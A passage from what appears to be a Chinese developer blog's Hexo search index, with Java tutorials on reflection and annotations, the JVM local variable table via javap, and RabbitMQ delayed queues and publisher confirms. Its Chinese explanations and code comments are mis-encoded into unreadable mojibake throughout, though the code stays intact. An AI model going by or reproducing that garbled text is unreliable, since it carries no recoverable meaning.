NoSuchMethodException, IllegalAccessException, InvocationTargetException, InstantiationException {        Class clazz = Class.forName(&quot;org.example.reflection.User&quot;);        Constructor constructor = clazz.getDeclaredConstructor(String.class,int.class,int.class);        User user = (User)constructor.newInstance(&quot;huskyui&quot;,18,1);        System.out.println(user);        // getMethod ÂÖ•ÂèÇÊòØnull,Âπ∂‰∏îÊòØpublic        Method getName = clazz.getMethod(&quot;getName&quot;,null);        System.out.println(getName.invoke(user,null));        // setName ÂÖ•ÂèÇÊòØStringÁ±ªÂûãÔºå‰ΩÜÊòØÊòØprivate‰øÆÈ•∞ÁöÑÔºåÊàë‰ª¨ÈúÄË¶Å‰ΩøÁî®declaredMethod()ÔºåÂπ∂‰∏î‰ΩøÁî®setAccessible(true)        Method method = clazz.getDeclaredMethod(&quot;setName&quot;, String.class);        method.setAccessible(true);        method.invoke(user,&quot;adios&quot;);        System.out.println(user);        System.out.println(getName.invoke(user,null));    }</code></pre><h4 id="Ê≥®Ëß£"><a href="#Ê≥®Ëß£" class="headerlink" title="Ê≥®Ëß£"></a>Ê≥®Ëß£</h4><pre><code>// ÂÖÉÊ≥®Ëß£ Áî®‰∫é‰øÆÈ•∞Ê≥®Ëß£  Âú®java.lang.annotationbÂåÖ‰∏ãÊ≥®Ëß£@Target // ÈúÄË¶Å‰º†ÂÖ•ÂΩìÂâçÊ≥®Ëß£ÁöÑÔºåÈáåÈù¢ÁöÑÂÄºÊúâ TYPE(class Áî®),FIELD(Â≠óÊÆµ),METHOD.....@Document// Â¶ÇÊûúÊúâËøô‰∏™Ê≥®Ëß£Ôºå‰ºöÂÖ∂Ê≥®ÈáäÊàê‰∏∫Â∏¶Ê≥®ÈáäÂÖÉÁ¥†ÁöÑÂÖ¨ÂÖ±APIÁöÑ‰∏ÄÈÉ®ÂàÜ@Retention// ÊåáÁ§∫Ê≥®Ëß£Ë¶Å‰øùÁïôÂ§öÈïøÊó∂Èó¥ÔºåÈªòËÆ§ÊòØRetentionPolicy.ClASSÔºå‰∏ÄËà¨ÂÜôÊòØRetentionPolicy.RUNIME@Inherited// </code></pre><h4 id="‰∏æ‰æã"><a href="#‰∏æ‰æã" class="headerlink" title="‰∏æ‰æã"></a>‰∏æ‰æã</h4><pre><code>@Target(ElementType.FIELD)@Retention(value= RetentionPolicy.RUNTIME)public @interface FieldWang {    String fieldName();    String type();    int length();    String value() default &quot;hhhh&quot;;}@Target(value = {ElementType.TYPE})@Retention(value = RetentionPolicy.RUNTIME)public @interface TableWang {    String value();}@TableWang(&quot;db_user&quot;)public class User {    @FieldWang(fieldName = &quot;user_name&quot;,type = &quot;varchar&quot;,length = 10)    private String name;    @FieldWang(fieldName = &quot;user_age&quot;,type = &quot;int&quot;,length=10)    private int age;    @FieldWang(fieldName = &quot;user_id&quot;,type = &quot;int&quot;,length=11)    private int id;    public User(String name, int age, int id) {        this.name = name;        this.age = age;        this.id = id;    }    @Override    public String toString() {        final StringBuilder sb = new StringBuilder(&quot;User{&quot;);        sb.append(&quot;name=&apos;&quot;).append(name).append(&apos;\&apos;&apos;);        sb.append(&quot;, age=&quot;).append(age);        sb.append(&quot;, id=&quot;).append(id);        sb.append(&apos;}&apos;);        return sb.toString();    }    public String getName() {        return name;    }    private void setName(String name) {        this.name = name;    }    public int getAge() {        return age;    }    public void setAge(int age) {        this.age = age;    }    public int getId() {        return id;    }    public void setId(int id) {        this.id = id;    }}public static void main(String[] args) throws ClassNotFoundException {        Class clazz = Class.forName(&quot;org.example.reflection.User&quot;);        if(clazz.isAnnotationPresent(TableWang.class)){            TableWang tableWang = (TableWang) clazz.getAnnotation(TableWang.class);            System.out.println(tableWang.value());        }        for (Field field : clazz.getDeclaredFields()) {            if (field.isAnnotationPresent(FieldWang.class)) {                FieldWang fieldWang = (FieldWang)field.getAnnotation(FieldWang.class);                System.out.println(field.getName()+ &quot; &quot;+ fieldWang.fieldName() + &quot; &quot; + fieldWang.type() + &quot; &quot; + fieldWang.length());            }        } }// ËæìÂá∫/**db_username user_name varchar 10age user_age int 10id user_id int 11*/</code></pre><h4 id="‰∏æ‰æãMybatis‰∏≠ÁöÑ-Select"><a href="#‰∏æ‰æãMybatis‰∏≠ÁöÑ-Select" class="headerlink" title="‰∏æ‰æãMybatis‰∏≠ÁöÑ@Select"></a>‰∏æ‰æãMybatis‰∏≠ÁöÑ@Select</h4><pre><code>@Documented@Retention(RetentionPolicy.RUNTIME)@Target(ElementType.METHOD)@Repeatable(Select.List.class)public @interface Select {  /**   * Returns an SQL for retrieving record(s).   *   * @return an SQL for retrieving record(s)   */  String[] value();  /**   * @return A database id that correspond this statement   * @since 3.5.5   */  String databaseId() default &quot;&quot;;  /**   * The container annotation for {@link Select}.   * @author Kazuki Shimizu   * @since 3.5.5   */  @Documented  @Retention(RetentionPolicy.RUNTIME)  @Target(ElementType.METHOD)  @interface List {    Select[] value();  }}@Select(&quot;select * from test where id = 1 for update&quot;)Test selectForUpdate();// Êàë‰ª¨Êù•Áúãmybatis‰∏≠ÁöÑorg.apache.ibatis.builder.annotation.MapperAnnotationBuilder‰∏≠ÁöÑÊñπÊ≥ïvoid parseStatement(Method method)  void parseStatement(Method method) {    final Class&lt;?&gt; parameterTypeClass = getParameterType(method);    final LanguageDriver languageDriver = getLanguageDriver(method);    getAnnotationWrapper(method, true, statementAnnotationTypes).ifPresent(statementAnnotation -&gt; {         // ËøôÈáåËé∑ÂèñÂà∞Annotation        final SqlSource sqlSource = buildSqlSource(statementAnnotation.getAnnotation(), parameterTypeClass, languageDriver, method);„ÄÇ„ÄÇ„ÄÇ„ÄÇ        }   // Êàë‰ª¨ÂèØ‰ª•ÁúãÂà∞annotation.value()ÊñπÊ≥ï    private SqlSource buildSqlSource(Annotation annotation, Class&lt;?&gt; parameterType, LanguageDriver languageDriver,      Method method) {    if (annotation instanceof Select) {      return buildSqlSourceFromStrings(((Select) annotation).value(), parameterType, languageDriver);                                                                         </code></pre>]]></content>
      
      
      
        <tags>
            
            <tag> JavaÂ≠¶‰π† </tag>
            
            <tag> java </tag>
            
            <tag> ÂèçÂ∞Ñ </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>ËôöÊãüÊú∫Ê†àÁöÑÂ±ÄÈÉ®ÂèòÈáè</title>
      <link href="/2020/07/01/%E8%99%9A%E6%8B%9F%E6%9C%BA%E6%A0%88%E7%9A%84%E5%B1%80%E9%83%A8%E5%8F%98%E9%87%8F/"/>
      <url>/2020/07/01/%E8%99%9A%E6%8B%9F%E6%9C%BA%E6%A0%88%E7%9A%84%E5%B1%80%E9%83%A8%E5%8F%98%E9%87%8F/</url>
      
        <content type="html"><![CDATA[<pre><code>public class LocalVariableTest {    private int count = 0;    public static void main(String[] args) {        method();    }    public static void method() {        LocalVariableTest localVariableTest = new LocalVariableTest();        Date date = new Date();        int count = 10;        System.out.println(count);    }}</code></pre><p>Êàë‰ª¨Êù•Ëß£Êûê‰∏Ä‰∏ãmethod()Ëøô‰∏™ÊñπÊ≥ï</p><pre><code>javap -v LocalVariableTest.class// mainÊñπÊ≥ï  public static void main(java.lang.String[]);      // ÂÖ•ÂèÇÊòØ StringÁ±ªÂûãÁöÑÊï∞ÁªÑÔºåËøîÂõûÂÄºÊòØVoid    descriptor: ([Ljava/lang/String;)V    // ÊñπÊ≥ï‰øÆÈ•∞ public Âíåstatic    flags: ACC_PUBLIC, ACC_STATIC    Code:      stack=0, locals=1, args_size=1         0: invokestatic  #3                  // Method method:()V         3: return      LineNumberTable:        line 14: 0        line 15: 3      LocalVariableTable:        Start  Length  Slot  Name   Signature            0       4     0  args   [Ljava/lang/String;  public static void method();      // ÂÖ•ÂèÇÊòØÁ©∫ÔºåËøîÂõûÂÄºÊòØvoid    descriptor: ()V    // ÊñπÊ≥ï‰øÆÈ•∞ÊòØ public static     flags: ACC_PUBLIC, ACC_STATIC    Code:      stack=2, locals=3, args_size=0         0: new           #4                  // class org/example/jvm/runtimedata/virtualmachinestack/LocalVariableTest         3: dup         4: invokespecial #5                  // Method &quot;&lt;init&gt;&quot;:()V         7: astore_0         8: new           #6                  // class java/util/Date        11: dup        12: invokespecial #7                  // Method java/util/Date.&quot;&lt;init&gt;&quot;:()V        15: astore_1        16: bipush        10        18: istore_2        19: getstatic     #8                  // Field java/lang/System.out:Ljava/io/PrintStream;        22: iload_2        23: invokevirtual #9                  // Method java/io/PrintStream.println:(I)V        26: return       // jvm‰∏≠ÂØπÂ∫îÂÖ≥Á≥ªÔºåË≠¨Â¶Ç javaÊñá‰ª∂‰∏≠18Ë°åLocalVariableTest localVariableTest = new LocalVariableTest();       // ÂØπÂ∫î  jvmÊåá‰ª§Ë°å 0  0: new           #4                  // class org/example/jvm/runtimedata/virtualmachinestack/LocalVariableTest      LineNumberTable:        line 18: 0        line 19: 8        line 20: 16        line 21: 19        line 22: 26      // Â±ÄÈÉ®ÂèòÈáèË°®ÔºölocalVariableTest ,date,count  signatureÊòØÂØπÂ∫îÁùÄÂá†‰∏™ÁöÑÁ±ªÂûãÔºå‰ªñ‰ª¨ÊòØÂú®‰∏Ä‰∏™Êï∞ÁªÑÈáåÈù¢ÁöÑ      // localVariableTestÊòØÊï∞ÁªÑindex 0ÁöÑ‰ΩçÁΩÆÔºådateÊòØindex 1ÁöÑ‰ΩçÁΩÆcountÊòØ2ÁöÑ‰ΩçÁΩÆ      // startÊòØjvm‰∏≠ÂèëÂØπÂ∫îÁöÑÂ±ÄÈÉ®ÂèòÈáèÂºÄÂßãÁîüÊïàÁöÑ‰ΩçÁΩÆÔºålengthÊòØÊúâÊïàÁöÑÈïøÂ∫¶Ôºà‰∏çËØ¶Ôºâ      // jvmÊåá‰ª§Ë°å‰∏≠ÊòØ0-26Ë°åÔºå‰πüÂ∞±ÊòØ‰∏ÄÂÖ±27Ë°åÔºåËÄåstart+lengthÈÉΩÊòØ27      LocalVariableTable:        Start  Length  Slot  Name   Signature            8      19     0 localVariableTest   Lorg/example/jvm/runtimedata/virtualmachinestack/LocalVariableTest;           16      11     1  date   Ljava/util/Date;           19       8     2 count   I</code></pre>]]></content>
      
      
      
        <tags>
            
            <tag> java </tag>
            
            <tag> JVM </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>RabbitMQ-Âª∂ËøüÈòüÂàó</title>
      <link href="/2020/05/13/RabbitMQ-%E5%BB%B6%E8%BF%9F%E9%98%9F%E5%88%97/"/>
      <url>/2020/05/13/RabbitMQ-%E5%BB%B6%E8%BF%9F%E9%98%9F%E5%88%97/</url>
      
        <content type="html"><![CDATA[<h3 id="RabbitMQÂª∂ËøüÈòüÂàó"><a href="#RabbitMQÂª∂ËøüÈòüÂàó" class="headerlink" title="RabbitMQÂª∂ËøüÈòüÂàó"></a>RabbitMQÂª∂ËøüÈòüÂàó</h3><h4 id="‰ªãÁªç"><a href="#‰ªãÁªç" class="headerlink" title="‰ªãÁªç"></a>‰ªãÁªç</h4><p>[ ÂÆòÁΩë‰∏äÁöÑ‰ªãÁªç ](<a href="https://www.rabbitmq.com/blog/2015/04/16/scheduling-messages-with-" target="_blank" rel="noopener">https://www.rabbitmq.com/blog/2015/04/16/scheduling-messages-with-</a><br>rabbitmq/)</p><p>ÂÆûÁé∞ÊñπÂºèÔºö</p><ul><li>Ê∑∑Âêà‰ΩøÁî®message TTL Âíå Dead Letter Exchanges </li><li>‰ΩøÁî® <a href="https://github.com/rabbitmq/rabbitmq-delayed-message-exchange/" target="_blank" rel="noopener"> RabbitMQ Delayed Message Plugin </a> Êù•ÂÆûÁé∞ </li></ul><h4 id="Ê∑∑Âêà‰ΩøÁî®Message-TTLÂíåDead-Letter-Exchanges"><a href="#Ê∑∑Âêà‰ΩøÁî®Message-TTLÂíåDead-Letter-Exchanges" class="headerlink" title="Ê∑∑Âêà‰ΩøÁî®Message TTLÂíåDead Letter Exchanges"></a>Ê∑∑Âêà‰ΩøÁî®Message TTLÂíåDead Letter Exchanges</h4><p><img src="http://qjrzrivoh.hd-bkt.clouddn.com/1605373837.98158571988.png" alt="YJrwJP.jpg"></p><p>Âà©Áî®dead letter exchangeÁöÑËßÑÂàô</p><ul><li>The message is <a href="https://www.rabbitmq.com/confirms.html" target="_blank" rel="noopener"> negatively acknowledged </a> by a consumer using basic.reject or basic.nack with requeue parameter set to false.Ê∂àË¥πËÄÖÊãíÁªùÊàñËÄÖnack </li><li>The message expires due to <a href="https://www.rabbitmq.com/ttl.html" target="_blank" rel="noopener"> per-message TTL </a> ; or Ê∂àÊÅØttl </li><li>The message is dropped because its queue exceeded a <a href="https://www.rabbitmq.com/maxlength.html" target="_blank" rel="noopener"> length limit </a> Ê∂àÊÅØË¢´‰∏¢ÂºÉÁî±‰∫éÈòüÂàóË∂ÖËøáÈïøÂ∫¶ÈôêÂà∂ </li></ul><p>Áîü‰∫ßËÄÖÂèëÈÄÅÊ∂àÊÅØÁªôÂª∂Ëøü‰∫§Êç¢Êú∫Êó∂ÔºåËÆ©Ê∂àÊÅØËÆæÁΩÆÁâπÂÆöÊó∂Èó¥ËøáÊúüÔºåËΩ¨ÂèëÂà∞Âª∂ËøüÈòüÂàó„ÄÇËøô‰∏™Âª∂ËøüÈòüÂàóÂàõÂª∫Êó∂ÔºåÂ£∞Êòédead letter exchange nameÂíådead<br>letter routing<br>key„ÄÇÁî±‰∫éÊ≤°ÊúâËÆæÁΩÆÊ∂àË¥πËÄÖÔºåÂéªÁõëÂê¨Ëøô‰∏™Âª∂ËøüÈòüÂàóÔºåÂØºËá¥Ëøô‰∏™Ê∂àÊÅØttlÔºåÊúÄÁªàËΩ¨ÂèëÂà∞Ê≠ª‰ø°exchangeÔºåÊ†πÊçÆÊ≠ª‰ø°routingkeyËΩ¨ÂèëÊ≠ª‰ø°ÈòüÂàó„ÄÇÔºàËøôËæπÁöÑ‰æãÂ≠êÔºåÊàë‰ºöÂú®‰∏ãÈù¢‰∏æ‰æãÔºâ</p><p><strong>Ê∂àË¥πËÄÖ</strong></p><pre><code># application.ymlserver:  port: 8080spring:  rabbitmq:    username: username    password: password    host: localhost    port: 5672    virtual-host: /test@Configurationpublic class RabbitConfig {       private static final String DELAY_QUEUE_NAME = &quot;test_delay_ttl_springboot_queue&quot;;        private static final String DELAY_EXCHANGE_NAME = &quot;test_delay_ttl_springboot_exchange&quot;;        private static final String DELAY_ROUTING_KEY = &quot;test_delay_ttl_springboot_routingkey&quot;;        private static final String DEAD_QUEUE_NAME = &quot;test_dead_ttl_springboot_queue&quot;;        private static final String DEAD_EXCHANGE_NAME = &quot;test_dead_ttl_springboot_exchange&quot;;        private static final String DEAD_ROUTING_KEY = &quot;test_dead_ttl_springboot_routingkey&quot;;    // Âª∂ËøüÈòüÂàó        @Bean        public Queue dealyQueue(){            Map&lt;String,Object&gt; args = new HashMap&lt;&gt;();            // x-dead-letter-exchange ÂΩìÂâçÈòüÂàóÂ£∞ÊòéÁöÑÊ≠ª‰ø°Ë∑ØÁî±            args.put(&quot;x-dead-letter-exchange&quot;, DEAD_EXCHANGE_NAME);            // x-dead-letter-routing-key  ËøôÈáåÂ£∞ÊòéÂΩìÂâçÈòüÂàóÁöÑÊ≠ª‰ø°Ë∑ØÁî±key            args.put(&quot;x-dead-letter-routing-key&quot;, DEAD_ROUTING_KEY);            return QueueBuilder.durable(DELAY_QUEUE_NAME).withArguments(args).build();        }    // Ê≠ª‰ø°queue        @Bean        public Queue deadQueue(){            return new Queue(DEAD_QUEUE_NAME);        }    // Âª∂Ëøüexchange        @Bean        public DirectExchange delayExchange(){            return new DirectExchange(DELAY_EXCHANGE_NAME);        }// Ê≠ª‰ø°exchange        @Bean        public DirectExchange deadExchange(){            return new DirectExchange(DEAD_EXCHANGE_NAME);        }        @Bean        public Binding dealyBinding(@Qualifier(&quot;dealyQueue&quot;)Queue queue,@Qualifier(&quot;delayExchange&quot;)Exchange exchange){            return BindingBuilder.bind(queue).to(exchange).with(DELAY_ROUTING_KEY).noargs();        }        @Bean        public Binding deadBinding(@Qualifier(&quot;deadQueue&quot;)Queue queue,@Qualifier(&quot;deadExchange&quot;)Exchange exchange){            return BindingBuilder.bind(queue).to(exchange).with(DEAD_ROUTING_KEY).noargs();        }    }    private static final String DELAY_EXCHANGE_NAME = &quot;test_delay_ttl_springboot_exchange&quot;;    private static final String DELAY_ROUTING_KEY = &quot;test_delay_ttl_springboot_routingkey&quot;;    @Resource    private RabbitTemplate rabbitTemplate;    @Override    public void sendDelayMsgTTL(String msg, Integer delay) {        rabbitTemplate.convertAndSend(DELAY_EXCHANGE_NAME,DELAY_ROUTING_KEY,msg,msgProcessor-&gt;{            msgProcessor.getMessageProperties().setExpiration(delay.toString());            return msgProcessor;        });    }// ÂèëÈÄÅÁü≠‰ø°mqService.sendDelayMsgTTL(&quot;hello,i send a delay msg by ttl&quot;,5000);</code></pre><p><strong>Ê∂àË¥πËÄÖ</strong></p><p>Ê∂àË¥πËÄÖÈÖçÁΩÆÊñá‰ª∂ÂíåÁîüÊàêËÄÖ‰∏ÄÊ†∑</p><pre><code>private static final String DEAD_QUEUE_NAME = &quot;test_dead_ttl_springboot_queue&quot;;@RabbitListener(queues = DEAD_QUEUE_NAME)public void delay(Message message, Channel channel) throws IOException {    String msg = new String(message.getBody(),&quot;UTF-8&quot;);    System.out.println(&quot;msg : &quot; + msg);    channel.basicAck(message.getMessageProperties().getDeliveryTag(),false);}</code></pre><p>ËøêË°å‰∏äÈù¢Ê∂àË¥πËÄÖÔºåÂèØ‰ª•ÁúãÂà∞5ÁßíÂêéÊ∂àË¥πËÄÖÊî∂Âà∞</p><p>ÈÇ£‰πàÔºåÊàë‰ª¨Êù•ÁõëÂê¨Âª∂ËøüÈòüÂàó</p><pre><code>private static final String DEAD_QUEUE_NAME = &quot;test_dead_ttl_springboot_queue&quot;;@RabbitListener(queues = &quot;test_delay_ttl_springboot_queue&quot;)public void delay(Message message, Channel channel) throws IOException {    String msg = new String(message.getBody(),&quot;UTF-8&quot;);    System.out.println(&quot;msg : &quot; + msg);    channel.basicAck(message.getMessageProperties().getDeliveryTag(),false);}@RabbitListener(queues = DEAD_QUEUE_NAME)public void delay2(Message message, Channel channel) throws IOException {    String msg = new String(message.getBody(),&quot;UTF-8&quot;);    System.out.println(&quot;msg : &quot; + msg);    channel.basicAck(message.getMessageProperties().getDeliveryTag(),false);}</code></pre><p>ÂèØ‰ª•ÁúãÂà∞ÔºåÁîü‰∫ßËÄÖÂèëÈÄÅÊ∂àÊÅØÔºåÊ∂àË¥πËÄÖÁû¨Èó¥Êî∂Âà∞„ÄÇÂπ∂‰∏îÊ≠ª‰ø°ÈòüÂàó‰∏ç‰ºöÁõëÂê¨Âà∞Ê∂àÊÅØ„ÄÇ</p><h4 id="‰ΩøÁî®RabbitMQ-Delayed-Message-PluginÊù•ÂÆûÁé∞Âª∂ËøüÈòüÂàó"><a href="#‰ΩøÁî®RabbitMQ-Delayed-Message-PluginÊù•ÂÆûÁé∞Âª∂ËøüÈòüÂàó" class="headerlink" title="‰ΩøÁî®RabbitMQ Delayed Message PluginÊù•ÂÆûÁé∞Âª∂ËøüÈòüÂàó"></a>‰ΩøÁî®RabbitMQ Delayed Message PluginÊù•ÂÆûÁé∞Âª∂ËøüÈòüÂàó</h4><p>ÂÆâË£ÖÊ≠•È™§</p><ul><li>ÂâçÂæÄ<a href="https://www.rabbitmq.com/community-plugins.htmlÔºå‰∏ãËΩΩ" target="_blank" rel="noopener">https://www.rabbitmq.com/community-plugins.htmlÔºå‰∏ãËΩΩ</a> <strong>rabbitmq_delayed_message_exchange</strong> Êèí‰ª∂ </li><li>Â∞Ü‰∏ãËΩΩÂ•ΩÁöÑÊèí‰ª∂ÊîæÂÖ•rabbitmqÂÆâË£ÖÁõÆÂΩï‰∏≠ÁöÑplugin Êñá‰ª∂Â§π‰∏ã </li><li>ÊâßË°åÂëΩ‰ª§ <code>rabbitmq-plugins enable rabbitmq_delayed_message_exchange</code> ËÆ©ËØ•pluginÂèØ‰ª•‰ΩøÁî® </li><li>Êèí‰ª∂ÂÆâË£ÖÂÆåÊØïÂêéÔºåÂ∞±‰ºöÊúâ‰∏Ä‰∏™x-delayed-messageÁ±ªÂûãÁöÑexchange<br>‰ª£Á†Å</li></ul><pre><code>// Â£∞ÊòéÈòüÂàóÂíåqueueprivate static final String DELAY_QUEUE_NAME = &quot;test_delay_queue_springboot&quot;;    private static final String DELAY_EXCHANGE_NAME = &quot;test_delay_exchange_springboot&quot;;    private static final String DELAY_EXCHANGE_ROUTING_KEY = &quot;test_delay_routingkey_springboot&quot;;    @Bean    public Queue delayQueue(){        return new Queue(DELAY_QUEUE_NAME);    }    @Bean    public CustomExchange customExchange(){        Map&lt;String,Object&gt; args = new HashMap&lt;&gt;();        args.put(&quot;x-delayed-type&quot;,&quot;direct&quot;);        return new CustomExchange(DELAY_EXCHANGE_NAME,&quot;x-delayed-message&quot;,true,false,args);    }    @Bean    public Binding binding(@Qualifier(&quot;delayQueue&quot;)Queue queue,@Qualifier(&quot;customExchange&quot;)CustomExchange customExchange){        return BindingBuilder.bind(queue).to(customExchange).with(DELAY_EXCHANGE_ROUTING_KEY).noargs();    }// ËÆæÁΩÆÂÖ∑‰ΩìÁöÑÂª∂ËøüÊó∂Èó¥@Override    public void sendDelayMsg(String message, Integer delay) {        rabbitTemplate.convertAndSend(DELAY_EXCHANGE_NAME,DELAY_EXCHANGE_ROUTING_KEY,message,msgProcessor-&gt;{            msgProcessor.getMessageProperties().setDelay(delay);            return msgProcessor;        });    }// Êé•Êî∂Ê∂àÊÅØ    @RabbitListener(queues = DELAY_QUEUE_NAME)    public void delay(Message message, Channel channel) throws IOException {        String msg = new String(message.getBody(),&quot;UTF-8&quot;);        System.out.println(&quot;msg : &quot; + msg);        // ÂèØ‰ª•ÁúãÂà∞ÂÖ∑‰ΩìÂª∂Ëøü‰∫ÜÂ§öÂ∞ëÊó∂Èó¥ÔºåÂÖ∂ÂÆû‰πüÂ∞±ÊòØx-delayËøô‰∏™Â§¥        System.out.println(message.getMessageProperties().getReceivedDelay());        channel.basicAck(message.getMessageProperties().getDeliveryTag(),false);    }</code></pre><p>ÂèØ‰ª•ÁúãÂà∞‰ΩøÁî®Êèí‰ª∂‰πüÂèØ‰ª•ÂÆûÁé∞Ëøô‰∏™ÂäüËÉΩ„ÄÇ</p><h4 id="‰∏ãÈù¢ÔºåÊàë‰ª¨Êù•ÊµãËØï‰∏Ä‰∏ãÊ≠ª‰ø°Áõ∏ÂÖ≥ÁöÑÂäüËÉΩ"><a href="#‰∏ãÈù¢ÔºåÊàë‰ª¨Êù•ÊµãËØï‰∏Ä‰∏ãÊ≠ª‰ø°Áõ∏ÂÖ≥ÁöÑÂäüËÉΩ" class="headerlink" title="‰∏ãÈù¢ÔºåÊàë‰ª¨Êù•ÊµãËØï‰∏Ä‰∏ãÊ≠ª‰ø°Áõ∏ÂÖ≥ÁöÑÂäüËÉΩ"></a>‰∏ãÈù¢ÔºåÊàë‰ª¨Êù•ÊµãËØï‰∏Ä‰∏ãÊ≠ª‰ø°Áõ∏ÂÖ≥ÁöÑÂäüËÉΩ</h4><p>Êàë‰ª¨ÂèëÁîü‰∏ÄÊù°‰ø°ÊÅØÂà∞Âª∂ËøüÈòüÂàóÈáåÈù¢ÔºåÁõëÂê¨Ëøô‰∏™ÈòüÂàóÔºåÊ∂àË¥πÁöÑÊó∂ÂÄôÊãíÁªùËøô‰∏™Ê∂àÊÅØÔºåËøôÊ†∑ËøôÊù°Ê∂àÊÅØÂ∞±‰ºöÂèëÂæÄÊ≠ª‰ø°ÈòüÂàó</p><pre><code>// Áîü‰∫ßËÄÖ   @Override    public void sendMsgUAck(String message) {        rabbitTemplate.convertAndSend(DELAY_EXCHANGE_NAME,DELAY_ROUTING_KEY,message);    }   // Ê∂àË¥πËÄÖ//ÁõëÂê¨Ê≠ª‰ø°ÈòüÂàó   @RabbitListener(queues = DEAD_QUEUE_NAME)    public void delay2(Message message, Channel channel) throws IOException {        String msg = new String(message.getBody(),&quot;UTF-8&quot;);        System.out.println(&quot;msg : &quot; + msg);        channel.basicAck(message.getMessageProperties().getDeliveryTag(),false);    }// ÁõëÂê¨Âª∂ËøüÈòüÂàó    @RabbitListener(queues = &quot;test_delay_ttl_springboot_queue&quot;)    public void delay3(Message message, Channel channel) throws IOException {        channel.basicNack(message.getMessageProperties().getDeliveryTag(),false,false);        System.out.println(&quot;uack message&quot;);    }</code></pre><p>ÂèØ‰ª•ÁúãÂà∞ÂèëÁîüÊ∂àÊÅØÔºåÂª∂ËøüÈòüÂàóÊ∂àË¥πËÄÖÊãíÁªùÔºåÁ´ãÂàªÂèëÂæÄÊ≠ª‰ø°ÈòüÂàó„ÄÇÔºàÊâ£Â∫ìÂ≠òÁõ∏ÂÖ≥ÈÄªËæëÔºåÂèØ‰ª•ÂèÇËÄÉÔºâ</p><h4 id="ÂèÇËÄÉ"><a href="#ÂèÇËÄÉ" class="headerlink" title="ÂèÇËÄÉ"></a>ÂèÇËÄÉ</h4><p>[ ÂÆòÊñπÊñáÊ°£ ](<a href="https://www.rabbitmq.com/blog/2015/04/16/scheduling-messages-with-" target="_blank" rel="noopener">https://www.rabbitmq.com/blog/2015/04/16/scheduling-messages-with-</a><br>rabbitmq/)</p><p><a href="https://www.cnblogs.com/mfrank/p/11260355.html" target="_blank" rel="noopener"> ÂºóÂÖ∞ÂÖãÁöÑÁå´ÁöÑÂçöÊñá </a></p>]]></content>
      
      
      
        <tags>
            
            <tag> RabbitMQ </tag>
            
            <tag> rabbitmq </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>RabbitMQ-Publisher Confirms</title>
      <link href="/2020/05/07/RabbitMQ-Publisher%20Confirms/"/>
      <url>/2020/05/07/RabbitMQ-Publisher%20Confirms/</url>
      
        <content type="html"><![CDATA[<h4 id="Publisher-Confirms"><a href="#Publisher-Confirms" class="headerlink" title="Publisher Confirms"></a>Publisher Confirms</h4><p>[ Publisher confirms ](<a href="https://www.rabbitmq.com/confirms.html#publisher-" target="_blank" rel="noopener">https://www.rabbitmq.com/confirms.html#publisher-</a><br>confirms) are a RabbitMQ extension to implement reliable publishing. When<br>publisher confirms are enabled on a channel, messages the client publishes are<br>confirmed asynchronously by the broker, meaning they have been taken care of<br>on the server side.</p><p>publisher confirmsÊòØ‰∏Ä‰∏™RabbitMQÁöÑÊèí‰ª∂Áî®‰∫éÂÆûÁé∞ÂèØÈù†ÁöÑÂèëÂ∏É„ÄÇÂΩìpublisher<br>confirmsÂú®channel‰∏äÂêØÁî®Êó∂ÔºåbrokerÂ∞ÜÂºÇÊ≠•Á°ÆËÆ§ÂÆ¢Êà∑Á´ØÂèëÈÄÅÁöÑ‰ø°ÊÅØÔºåÊÑèÂë≥ÁùÄÊúçÂä°Á´ØÊé•Êî∂Âà∞‰∫ÜÊ∂àÊÅØ„ÄÇ</p><h4 id="Âú®channel‰∏äÂêØÁî®publisherconfirm"><a href="#Âú®channel‰∏äÂêØÁî®publisherconfirm" class="headerlink" title="Âú®channel‰∏äÂêØÁî®publisherconfirm"></a>Âú®channel‰∏äÂêØÁî®publisherconfirm</h4><pre><code>Channel channel = connection.createChannel();channel.confirmSelect();</code></pre><h4 id="publishing-Message-individually-ÂçïÁã¨ÂèëÈÄÅÊ∂àÊÅØ"><a href="#publishing-Message-individually-ÂçïÁã¨ÂèëÈÄÅÊ∂àÊÅØ" class="headerlink" title="publishing Message individually ÂçïÁã¨ÂèëÈÄÅÊ∂àÊÅØ"></a>publishing Message individually ÂçïÁã¨ÂèëÈÄÅÊ∂àÊÅØ</h4><pre><code>private final static String QUEUE_NAME = &quot;test_queue_confirm1&quot;;public static void main(String[] args) throws IOException, TimeoutException, InterruptedException {    Connection connection = ConnectionUtils.getConnection();    Channel channel = connection.createChannel();    channel.queueDeclare(QUEUE_NAME,false,false,false,null);    // Áîü‰∫ßËÄÖË∞ÉÁî®confirmSelectÂ∞ÜchannelËÆæÁΩÆ‰∏∫confirmÊ®°ÂºèÊ≥®ÊÑè    channel.confirmSelect();    String message = &quot;hello confirm message&quot;;    channel.basicPublish(&quot;&quot;,QUEUE_NAME,null,message.getBytes());    if(!channel.waitForConfirms()){        System.out.println(&quot;message send failed&quot;);    }else{        System.out.println(&quot;message send ok&quot;);    }    channel.close();    connection.close();}</code></pre><h4 id="publishing-messages-in-batches-ÊâπÈáèÂèëÈÄÅÊ∂àÊÅØ"><a href="#publishing-messages-in-batches-ÊâπÈáèÂèëÈÄÅÊ∂àÊÅØ" class="headerlink" title="publishing messages in batches ÊâπÈáèÂèëÈÄÅÊ∂àÊÅØ"></a>publishing messages in batches ÊâπÈáèÂèëÈÄÅÊ∂àÊÅØ</h4><pre><code>private final static String QUEUE_NAME = &quot;test_queue_confirm2&quot;;   public static void main(String[] args) throws IOException, TimeoutException, InterruptedException {       Connection connection = ConnectionUtils.getConnection();       Channel channel = connection.createChannel();       channel.queueDeclare(QUEUE_NAME,false,false,false,null);       // Áîü‰∫ßËÄÖË∞ÉÁî®confirmSelectÂ∞ÜchannelËÆæÁΩÆ‰∏∫confirmÊ®°ÂºèÊ≥®ÊÑè       // ÊâπÈáè       channel.confirmSelect();       for (int i = 0;i&lt;10;i++) {           String message = &quot;hello confirm message &quot; + i;           channel.basicPublish(&quot;&quot;, QUEUE_NAME, null, message.getBytes());       }       if(!channel.waitForConfirms()){           System.out.println(&quot;message send failed&quot;);       }else{           System.out.println(&quot;message send ok&quot;);       }       channel.close();       connection.close();   }</code></pre><h4 id="handling-publisher-confirms-asynchronously-ÂºÇÊ≠•Âú∞Â§ÑÁêÜÊ∂àÊÅØÁ°ÆËÆ§"><a 